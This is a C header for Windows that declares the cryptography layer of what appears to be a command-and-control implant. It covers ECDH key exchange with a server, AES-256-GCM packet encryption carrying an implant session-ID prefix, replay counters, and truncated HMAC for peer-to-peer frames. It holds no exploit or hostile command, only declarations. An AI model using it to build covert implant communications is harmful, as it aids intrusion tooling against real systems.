#ifndef JAGER_CRYPTO_H
#define JAGER_CRYPTO_H

#include <windows.h>

#define SESSION_ID_HASH_SIZE 16
#define MAX_COUNTER_GAP      1000

typedef struct {
    BYTE session_key[32];     /* AES-256 key from ECDH */
    BYTE send_nonce[12];      /* Per-message nonce (counter + random suffix) */
    BYTE recv_nonce[12];      /* Expected receive nonce suffix tracking */
    BYTE session_id_hash[SESSION_ID_HASH_SIZE]; /* Truncated SHA256 of session ID */
    DWORD send_counter;       /* Monotonic send counter */
    DWORD recv_counter;       /* Expected next receive counter */
    BOOL initialized;
    BOOL has_session_id;      /* session_id_hash populated */
} CRYPTO_CTX;

/* Generate ECDH keypair; export public key bytes for registration */
BOOL crypto_init(CRYPTO_CTX *ctx, BYTE *pubkey_out, DWORD *pubkey_len);

/* Derive session key from server's ECDH public key response */
BOOL crypto_derive_session_key(CRYPTO_CTX *ctx, const BYTE *server_pubkey, DWORD server_pubkey_len);

/* Store truncated SHA256 hash of implant/session ID for wire routing prefix */
void crypto_set_session_id(CRYPTO_CTX *ctx, const char *session_id);

/*
 * Encrypt plaintext with AES-256-GCM.
 * Returns heap buffer: [16-byte session_id_hash][4-byte counter BE][12-byte nonce][16-byte tag][ciphertext]
 */
BYTE *crypto_encrypt(CRYPTO_CTX *ctx, const BYTE *plaintext, DWORD pt_len, DWORD *out_len);

/*
 * Decrypt packet: [16-byte session_id_hash][4-byte counter BE][12-byte nonce][16-byte tag][ciphertext]
 * Returns heap-allocated plaintext; NULL on failure/replay.
 */
BYTE *crypto_decrypt(CRYPTO_CTX *ctx, const BYTE *packet, DWORD pkt_len, DWORD *out_len);

/* Zero sensitive state */
void crypto_cleanup(CRYPTO_CTX *ctx);

/* Compute first 8 bytes of HMAC-SHA256(key, data) for P2P frame auth */
BOOL crypto_hmac_trunc8(const BYTE *key, DWORD key_len,
                        const BYTE *data, DWORD data_len,
                        BYTE out[8]);

#endif /* JAGER_CRYPTO_H */
